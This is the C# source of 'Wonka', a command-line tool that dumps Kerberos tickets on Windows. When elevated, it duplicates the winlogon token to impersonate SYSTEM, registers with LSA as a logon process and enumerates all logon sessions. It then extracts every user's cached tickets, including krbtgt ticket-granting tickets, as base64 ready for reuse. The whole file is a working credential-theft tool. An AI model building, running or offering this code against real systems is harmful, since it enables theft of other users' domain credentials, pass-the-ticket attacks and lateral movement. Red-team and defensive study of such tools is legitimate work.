using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

class Program
{
    static int Main(string[] args)
    {
        CliOptions options;
        try
        {
            options = CliOptions.Parse(args);
        }
        catch (ArgumentException ex)
        {
            Console.WriteLine($"[-] Invalid arguments: {ex.Message}\n");
            CliOptions.PrintUsage();
            return 1;
        }

        if (options.ShowHelp)
        {
            CliOptions.PrintUsage();
            return 0;
        }

        Console.WriteLine("Starting Kerberos ticket extraction process...");

        try
        {
            var ticketDumper = new KerberosTicketDumper(options);
            ticketDumper.Run();
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Critical error: {ex.Message}");
            Console.WriteLine(ex.StackTrace);
            return 1;
        }

        Console.WriteLine("Process completed.");
        return 0;
    }
}

/// 
/// What the user asked the tool to do.
/// 
public enum RunMode
{
    /// List users and ticket metadata only (no base64 extraction).
    List,
    /// Extract tickets (base64), optionally filtered to a single ticket.
    Dump
}

/// 
/// Parsed command line options.
/// 
public class CliOptions
{
    public RunMode Mode { get; private set; } = RunMode.Dump;
    public bool ShowHelp { get; private set; }

    /// Only process the session with this LUID low part (filter). Null = all.
    public uint? LuidFilter { get; private set; }

    /// Only dump tickets whose server name contains this value (case-insensitive). Null = all.
    public string? ServiceFilter { get; private set; }

    public bool HasFilter => LuidFilter.HasValue || ServiceFilter != null;

    public static CliOptions Parse(string[] args)
    {
        var options = new CliOptions();

        // No arguments -> show help instead of running a dump.
        if (args.Length == 0)
        {
            options.ShowHelp = true;
            return options;
        }

        foreach (var raw in args)
        {
            // Normalize: accept "list", "/list", "--list", "-list".
            string arg = raw.TrimStart('-', '/');
            string key = arg;
            string? value = null;

            int sep = arg.IndexOfAny(new[] { ':', '=' });
            if (sep >= 0)
            {
                key = arg.Substring(0, sep);
                value = arg.Substring(sep + 1);
            }

            switch (key.ToLowerInvariant())
            {
                case "list":
                    options.Mode = RunMode.List;
                    break;
                case "dump":
                    options.Mode = RunMode.Dump;
                    break;
                case "luid":
                    if (string.IsNullOrEmpty(value))
                        throw new ArgumentException("/luid requires a value, e.g. /luid:0x3e7");
                    options.LuidFilter = ParseLuid(value);
                    break;
                case "service":
                    if (string.IsNullOrEmpty(value))
                        throw new ArgumentException("/service requires a value, e.g. /service:krbtgt");
                    options.ServiceFilter = value;
                    break;
                case "h":
                case "help":
                case "?":
                    options.ShowHelp = true;
                    break;
                default:
                    throw new ArgumentException($"unknown option '{raw}'");
            }
        }

        // A LUID/service filter only makes sense when extracting a single ticket.
        if (options.Mode == RunMode.List && options.HasFilter)
            throw new ArgumentException("/luid and /service can only be used with dump, not list");

        return options;
    }

    private static uint ParseLuid(string value)
    {
        value = value.Trim();
        bool hex = value.StartsWith("0x", StringComparison.OrdinalIgnoreCase);
        string body = hex ? value.Substring(2) : value;
        if (uint.TryParse(body,
                hex ? System.Globalization.NumberStyles.HexNumber : System.Globalization.NumberStyles.Integer,
                System.Globalization.CultureInfo.InvariantCulture,
                out uint result))
        {
            return result;
        }
        throw new ArgumentException($"could not parse LUID '{value}'");
    }

    public static void PrintUsage()
    {
        Console.WriteLine(@"Wonka - Kerberos ticket extractor

Usage:
  Wonka.exe <list|dump> [/luid:<luid>] [/service:<name>]

  Run with no arguments (or -h) to show this help.

Privileges:
  Run as administrator  -> processes every logon session on the host.
  Run as standard user  -> processes only the current user's tickets.

Modes:
  dump                  Extract tickets (base64) for every accessible session.
  list                  List users and ticket metadata only (no base64).        [admin]

Filters (dump only, used to extract a single ticket):
  /luid:<luid>          Only the session with this LUID, e.g. /luid:0x3e7 or /luid:999.
  /service:<name>       Only tickets whose server name contains <name>,
                        e.g. /service:krbtgt or /service:cifs/server.domain

Examples:
  Wonka.exe dump                             Dump all accessible tickets.
  Wonka.exe list                             List users and their tickets.
  Wonka.exe dump /luid:0x3e7 /service:krbtgt Dump a single krbtgt ticket for a session.
  Wonka.exe -h                               Show this help.");
    }
}

public class KerberosTicketDumper
{
    private readonly CliOptions options;

    private IntPtr tokenHandle = IntPtr.Zero;
    private IntPtr dupTokenHandle = IntPtr.Zero;
    private IntPtr lsaHandle = IntPtr.Zero;
    private uint authPackage;
    private bool impersonating;

    public KerberosTicketDumper(CliOptions options)
    {
        this.options = options;
    }

    public void Run()
    {
        bool isAdmin = IsElevated();
        Console.WriteLine(isAdmin
            ? "[+] Running with administrative privileges"
            : "[*] Running as a standard user - only the current user's tickets are accessible");

        try
        {
            if (isAdmin)
                DumpAllSessions();
            else
                DumpCurrentUser();
        }
        finally
        {
            Cleanup();
        }
    }

    private static bool IsElevated()
    {
        try
        {
            using var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }
        catch
        {
            return false;
        }
    }

    // ---------------------------------------------------------------------
    // Administrative path: impersonate SYSTEM and enumerate every session.
    // ---------------------------------------------------------------------
    private void DumpAllSessions()
    {
        if (!ImpersonateSystem())
        {
            Console.WriteLine("[-] Could not impersonate as SYSTEM");
            return;
        }

        if (!InitializeLSAPrivileged())
        {
            Console.WriteLine("[-] Could not initialize LSA");
            return;
        }

        ProcessLogonSessions();
    }

    // ---------------------------------------------------------------------
    // Standard-user path: untrusted LSA connection, current session only.
    // ---------------------------------------------------------------------
    private void DumpCurrentUser()
    {
        if (!InitializeLSAUntrusted())
        {
            Console.WriteLine("[-] Could not initialize LSA");
            return;
        }

        string? currentUser = null;
        try { currentUser = WindowsIdentity.GetCurrent().Name; } catch { /* best effort */ }

        var sessionData = new win32.LogonSessionData
        {
            username = currentUser ?? "(current user)",
            LogonDomain = Environment.UserDomainName,
            AuthenticationPackage = "Kerberos"
        };

        // LUID {0,0} means "the caller's own logon session" for an untrusted handle.
        var ownLuid = new win32.LUID { LowPart = 0, HighPart = 0 };
        int ticketCount = ProcessTicketCache(ownLuid, sessionData);
        Console.WriteLine($"\n[+] Total tickets processed: {ticketCount}");
    }

    private bool ImpersonateSystem()
    {
        var winlogonProcesses = Process.GetProcessesByName("winlogon");
        if (winlogonProcesses.Length == 0)
        {
            Console.WriteLine("[-] Winlogon process not found");
            return false;
        }

        var winlogon = winlogonProcesses[0];
        Console.WriteLine($"[+] Winlogon process found (PID: {winlogon.Id})");
        try
        {
            bool status = win32.OpenProcessToken(winlogon.Handle, win32.TOKEN_QUERY | win32.TOKEN_DUPLICATE, out tokenHandle);
            if (!status)
            {
                Console.WriteLine($"[-] Error performing OpenProcessToken: {Marshal.GetLastWin32Error()}");
                return false;
            }
            Console.WriteLine("[+] Token obtained successfully");

            status = win32.DuplicateTokenEx(tokenHandle, win32.MAXIMUM_ALLOWED, IntPtr.Zero,
                win32.SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                win32.TOKEN_TYPE.TokenPrimary, out dupTokenHandle);
            if (!status)
            {
                Console.WriteLine($"[-] Error performing DuplicateTokenEx: {Marshal.GetLastWin32Error()}");
                return false;
            }
            Console.WriteLine("[+] Token duplicated successfully");

            status = win32.ImpersonateLoggedOnUser(dupTokenHandle);
            if (!status)
            {
                Console.WriteLine($"[-] Error impersonating user: {Marshal.GetLastWin32Error()}");
                return false;
            }
            impersonating = true;

            string? currentUser;
            try
            {
                currentUser = WindowsIdentity.GetCurrent().Name;
            }
            catch (PlatformNotSupportedException)
            {
                Console.WriteLine("[-] Error: Functionality not supported on this platform");
                return false;
            }

            Console.WriteLine($"[+] Current user: {currentUser}");

            if (currentUser != "NT AUTHORITY\\SYSTEM")
            {
                Console.WriteLine("[-] Error: Could not impersonate as SYSTEM");
                return false;
            }
            Console.WriteLine("[+] Successfully impersonated as SYSTEM");
            return true;
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[-] Error during impersonation: {ex.Message}");
            return false;
        }
    }

    private bool InitializeLSAPrivileged()
    {
        const string logonProcessName = "User32LogonProcess";
        IntPtr nameBuffer = Marshal.StringToHGlobalAnsi(logonProcessName);
        try
        {
            win32.LSA_STRING_IN LSAString = new win32.LSA_STRING_IN
            {
                Length = (ushort)logonProcessName.Length,
                MaximumLength = (ushort)(logonProcessName.Length + 1),
                buffer = nameBuffer
            };

            var ret = win32.LsaRegisterLogonProcess(LSAString, out lsaHandle, out _);
            if (ret != 0)
            {
                Console.WriteLine($"[-] Error in LsaRegisterLogonProcess: {ret}");
                return false;
            }
            Console.WriteLine("[+] LSA Process registered successfully");

            return LookupKerberosPackage();
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[-] Error during LSA initialization: {ex.Message}");
            return false;
        }
        finally
        {
            Marshal.FreeHGlobal(nameBuffer);
        }
    }

    private bool InitializeLSAUntrusted()
    {
        try
        {
            var ret = win32.LsaConnectUntrusted(out lsaHandle);
            if (ret != 0)
            {
                Console.WriteLine($"[-] Error in LsaConnectUntrusted: {ret}");
                return false;
            }
            Console.WriteLine("[+] LSA untrusted connection established");

            return LookupKerberosPackage();
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[-] Error during LSA initialization: {ex.Message}");
            return false;
        }
    }

    private bool LookupKerberosPackage()
    {
        const string krbname = "kerberos";
        IntPtr nameBuffer = Marshal.StringToHGlobalAnsi(krbname);
        try
        {
            win32.LSA_STRING_IN LSAString = new win32.LSA_STRING_IN
            {
                Length = (ushort)krbname.Length,
                MaximumLength = (ushort)(krbname.Length + 1),
                buffer = nameBuffer
            };

            var retcode = win32.LsaLookupAuthenticationPackage(lsaHandle, ref LSAString, out uint package);
            if (retcode != 0)
            {
                Console.WriteLine($"[-] Error looking up Kerberos authentication package: {retcode}");
                return false;
            }
            Console.WriteLine("[+] Kerberos authentication package found");
            authPackage = package;
            return true;
        }
        finally
        {
            Marshal.FreeHGlobal(nameBuffer);
        }
    }

    private void ProcessLogonSessions()
    {
        var ret = win32.LsaEnumerateLogonSessions(out uint count, out IntPtr luidPtr);
        if (ret != 0)
        {
            Console.WriteLine($"[-] Could not enumerate logon sessions: {ret}");
            return;
        }

        Console.WriteLine($"[+] Logon sessions found: {count}");

        List<win32.LUID> luids = new List<win32.LUID>();
        IntPtr currentPtr = luidPtr;

        for (var i = 0; i < count; i++)
        {
            win32.LUID luid = Marshal.PtrToStructure<win32.LUID>(currentPtr);
            luids.Add(luid);
            currentPtr = (IntPtr)(currentPtr.ToInt64() + Marshal.SizeOf<win32.LUID>());
        }

        win32.LsaFreeReturnBuffer(luidPtr);

        int ticketCount = 0;
        foreach (win32.LUID luid in luids)
        {
            // Apply the LUID filter early so we skip unrelated sessions entirely.
            if (options.LuidFilter.HasValue && luid.LowPart != options.LuidFilter.Value)
                continue;

            try
            {
                ticketCount += ProcessSession(luid);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Error processing session {luid.LowPart}: {ex.Message}");
            }
        }

        Console.WriteLine($"\n[+] Total tickets processed: {ticketCount}");
    }

    private int ProcessSession(win32.LUID luid)
    {
        IntPtr luidPtr = Marshal.AllocHGlobal(Marshal.SizeOf(luid));
        IntPtr sessionDataPtr = IntPtr.Zero;
        int ticketCount = 0;

        try
        {
            Marshal.StructureToPtr(luid, luidPtr, false);
            uint retGetLogon = win32.LsaGetLogonSessionData(luidPtr, out sessionDataPtr);
            if (retGetLogon != 0 || sessionDataPtr == IntPtr.Zero)
            {
                return 0; // Invalid session, continue with next
            }

            win32.SECURITY_LOGON_SESSION_DATA unsafeData = Marshal.PtrToStructure<win32.SECURITY_LOGON_SESSION_DATA>(sessionDataPtr);
            win32.LogonSessionData logonSessionData = new win32.LogonSessionData
            {
                AuthenticationPackage = Marshal.PtrToStringUni(unsafeData.AuthenticationPackage.buffer, unsafeData.AuthenticationPackage.Length / 2),
                DnsDomainName = Marshal.PtrToStringUni(unsafeData.DnsDomainName.buffer, unsafeData.DnsDomainName.Length / 2),
                LogonID = unsafeData.LogonID,
                LogonTime = DateTime.FromFileTime((long)unsafeData.LogonTime),
                LogonServer = Marshal.PtrToStringUni(unsafeData.LogonServer.buffer, unsafeData.LogonServer.Length / 2),
                logonType = (win32.LogonType)unsafeData.logontype,
                username = Marshal.PtrToStringUni(unsafeData.username.buffer, unsafeData.username.Length / 2),
                LogonDomain = Marshal.PtrToStringUni(unsafeData.LogonDomain.buffer, unsafeData.LogonDomain.Length / 2)
            };

            // Only process sessions with valid users
            if (string.IsNullOrEmpty(logonSessionData.username) ||
                logonSessionData.username.EndsWith("$") ||
                logonSessionData.logonType == win32.LogonType.UndefinedLogonType)
            {
                return 0;
            }

            ticketCount = ProcessTicketCache(luid, logonSessionData);
        }
        finally
        {
            if (sessionDataPtr != IntPtr.Zero)
                win32.LsaFreeReturnBuffer(sessionDataPtr);
            if (luidPtr != IntPtr.Zero)
                Marshal.FreeHGlobal(luidPtr);
        }

        return ticketCount;
    }

    private int ProcessTicketCache(win32.LUID luid, win32.LogonSessionData logonSessionData)
    {
        win32.KERB_QUERY_TKT_CACHE_REQUEST ticketCacheRequest = new win32.KERB_QUERY_TKT_CACHE_REQUEST
        {
            MessageType = win32.KERB_PROTOCOL_MESSAGE_TYPE.KerbQueryTicketCacheExMessage,
            LogonId = luid
        };

        IntPtr tQueryPtr = Marshal.AllocHGlobal(Marshal.SizeOf(ticketCacheRequest));
        IntPtr ticketsPointer = IntPtr.Zero;
        int ticketCount = 0;

        try
        {
            Marshal.StructureToPtr(ticketCacheRequest, tQueryPtr, false);

            var retcode = win32.LsaCallAuthenticationPackage(lsaHandle, authPackage, tQueryPtr,
                Marshal.SizeOf(ticketCacheRequest), out ticketsPointer, out ulong returnBufferLength, out int protocolStatus);

            if (retcode != 0 || ticketsPointer == IntPtr.Zero)
            {
                return 0;
            }

            win32.KERB_QUERY_TKT_CACHE_RESPONSE ticketCacheResponse = Marshal.PtrToStructure<win32.KERB_QUERY_TKT_CACHE_RESPONSE>(ticketsPointer);
            var count = ticketCacheResponse.CountOfTickets;

            if (count == 0)
            {
                return 0;
            }

            Console.WriteLine($"\n[+] User: {logonSessionData.username}@{logonSessionData.LogonDomain}");
            Console.WriteLine($"[+] LogonId: 0x{logonSessionData.LogonID.LowPart:x} | Tickets found: {count}");

            int dataSize = Marshal.SizeOf<win32.KERB_TICKET_CACHE_INFO_EX>();

            for (var j = 0; j < count; j++)
            {
                try
                {
                    IntPtr currTicketPtr = (IntPtr)(ticketsPointer.ToInt64() + (8 + j * dataSize));
                    win32.KERB_TICKET_CACHE_INFO_EX ticketResult = Marshal.PtrToStructure<win32.KERB_TICKET_CACHE_INFO_EX>(currTicketPtr);

                    // Apply the service filter (e.g. only the krbtgt ticket).
                    if (options.ServiceFilter != null)
                    {
                        string serverName = Marshal.PtrToStringUni(ticketResult.ServerName.Buffer, ticketResult.ServerName.Length / 2) ?? string.Empty;
                        if (serverName.IndexOf(options.ServiceFilter, StringComparison.OrdinalIgnoreCase) < 0)
                            continue;
                    }

                    DisplayTicketInfo(logonSessionData, ticketResult);

                    // In list mode we only show metadata; we never extract the base64 blob.
                    if (options.Mode == RunMode.Dump)
                        ExtractTicket(luid, ticketResult);
                    else
                        Console.WriteLine("-----------------------------------------------------------------------\n");

                    ticketCount++;
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[-] Error processing ticket {j}: {ex.Message}");
                }
            }
        }
        finally
        {
            if (ticketsPointer != IntPtr.Zero)
                win32.LsaFreeReturnBuffer(ticketsPointer);
            if (tQueryPtr != IntPtr.Zero)
                Marshal.FreeHGlobal(tQueryPtr);
        }

        return ticketCount;
    }

    private void DisplayTicketInfo(win32.LogonSessionData logonSessionData, win32.KERB_TICKET_CACHE_INFO_EX ticketResult)
    {
        Console.WriteLine("\n-----------------------------------------------------------------------");
        Console.WriteLine($"Username = {logonSessionData.username}");
        Console.WriteLine($"DnsDomainName = {logonSessionData.DnsDomainName}");
        Console.WriteLine($"LogonDomain = {logonSessionData.LogonDomain}");
        Console.WriteLine($"logonType = {logonSessionData.logonType}");
        Console.WriteLine($"AuthenticationPackage = {logonSessionData.AuthenticationPackage}");
        Console.WriteLine($"StartTime ---> {DateTime.FromFileTime(ticketResult.StartTime)}");
        Console.WriteLine($"EndTime ---> {DateTime.FromFileTime(ticketResult.EndTime)}");
        Console.WriteLine($"Renew Time ---> {DateTime.FromFileTime(ticketResult.RenewTime)}");
        Console.WriteLine($"TicketFlags ---> {(win32.TicketFlags)ticketResult.TicketFlags}");
        Console.WriteLine($"Encryption Type ---> {(win32.EncTypes)ticketResult.EncryptionType}");
        Console.WriteLine($"Server Name ---> {Marshal.PtrToStringUni(ticketResult.ServerName.Buffer, ticketResult.ServerName.Length / 2)}");
        Console.WriteLine($"Server Realm ---> {Marshal.PtrToStringUni(ticketResult.ServerRealm.Buffer, ticketResult.ServerRealm.Length / 2)}");
        Console.WriteLine($"Client Name ---> {Marshal.PtrToStringUni(ticketResult.ClientName.Buffer, ticketResult.ClientName.Length / 2)}");
        Console.WriteLine($"Client Realm ---> {Marshal.PtrToStringUni(ticketResult.ClientRealm.Buffer, ticketResult.ClientRealm.Length / 2)}");
    }

    private void ExtractTicket(win32.LUID luid, win32.KERB_TICKET_CACHE_INFO_EX ticketResult)
    {
        IntPtr responsePointer = IntPtr.Zero;
        IntPtr unmanagedAddr = IntPtr.Zero;
        IntPtr targetNameBuffer = IntPtr.Zero;

        try
        {
            string? serverName = Marshal.PtrToStringUni(ticketResult.ServerName.Buffer, ticketResult.ServerName.Length / 2);
            if (string.IsNullOrEmpty(serverName))
            {
                Console.WriteLine("[-] Skipping ticket: empty server name");
                return;
            }

            win32.KERB_RETRIEVE_TKT_REQUEST request = new win32.KERB_RETRIEVE_TKT_REQUEST
            {
                MessageType = win32.KERB_PROTOCOL_MESSAGE_TYPE.KerbRetrieveEncodedTicketMessage,
                LogonId = luid,
                TicketFlags = 0x0,
                CacheOptions = 0x8,
                EncryptionType = 0x0
            };

            targetNameBuffer = Marshal.StringToHGlobalUni(serverName);
            win32.UNICODE_STRING tname = new win32.UNICODE_STRING
            {
                Length = (ushort)(serverName.Length * 2),
                MaximumLength = (ushort)(serverName.Length * 2 + 2),
                Buffer = targetNameBuffer
            };
            request.TargetName = tname;

            var structSize = Marshal.SizeOf(request.GetType());
            int newStructSize = structSize + tname.MaximumLength;
            unmanagedAddr = Marshal.AllocHGlobal(newStructSize);

            Marshal.StructureToPtr(request, unmanagedAddr, false);

            IntPtr newTargetNameBuffPtr = (IntPtr)(unmanagedAddr.ToInt64() + structSize);
            win32.CopyMemory(newTargetNameBuffPtr, tname.Buffer, tname.MaximumLength);

            int size = IntPtr.Size == 8 ? 24 : 16;
            Marshal.WriteIntPtr(unmanagedAddr, size, newTargetNameBuffPtr);

            var retcode = win32.LsaCallAuthenticationPackage(lsaHandle, authPackage, unmanagedAddr, newStructSize,
                out responsePointer, out ulong returnBufferLength, out int protocolStatus);

            if (retcode == 0 && returnBufferLength != 0)
            {
                win32.KERB_RETRIEVE_TKT_RESPONSE response = Marshal.PtrToStructure<win32.KERB_RETRIEVE_TKT_RESPONSE>(responsePointer);
                var encodeTicketSize = response.Ticket.EncodedTicketSize;
                byte[] EncodedTicket = new byte[encodeTicketSize];

                Marshal.Copy(response.Ticket.EncodedTicket, EncodedTicket, 0, encodeTicketSize);

                Console.WriteLine($"Ticket b64 ---> {Convert.ToBase64String(EncodedTicket)}");
                Console.WriteLine($"EncType ---> {(win32.EncTypes)response.Ticket.SessionKey.KeyType}");
            }
            else
            {
                Console.WriteLine($"[-] Error extracting ticket: {retcode}, ProtocolStatus: {protocolStatus}");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[-] Error in ExtractTicket: {ex.Message}");
        }
        finally
        {
            if (responsePointer != IntPtr.Zero)
                win32.LsaFreeReturnBuffer(responsePointer);
            if (unmanagedAddr != IntPtr.Zero)
                Marshal.FreeHGlobal(unmanagedAddr);
            if (targetNameBuffer != IntPtr.Zero)
                Marshal.FreeHGlobal(targetNameBuffer);
        }

        Console.WriteLine("-----------------------------------------------------------------------\n");
    }

    private void Cleanup()
    {
        try
        {
            if (impersonating)
            {
                win32.RevertToSelf();
                impersonating = false;
            }

            if (tokenHandle != IntPtr.Zero)
            {
                win32.CloseHandle(tokenHandle);
                tokenHandle = IntPtr.Zero;
            }

            if (dupTokenHandle != IntPtr.Zero)
            {
                win32.CloseHandle(dupTokenHandle);
                dupTokenHandle = IntPtr.Zero;
            }

            if (lsaHandle != IntPtr.Zero)
            {
                win32.LsaDeregisterLogonProcess(lsaHandle);
                lsaHandle = IntPtr.Zero;
            }
            Console.WriteLine("[+] Resources cleaned up successfully");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[-] Error during cleanup: {ex.Message}");
        }
    }
}
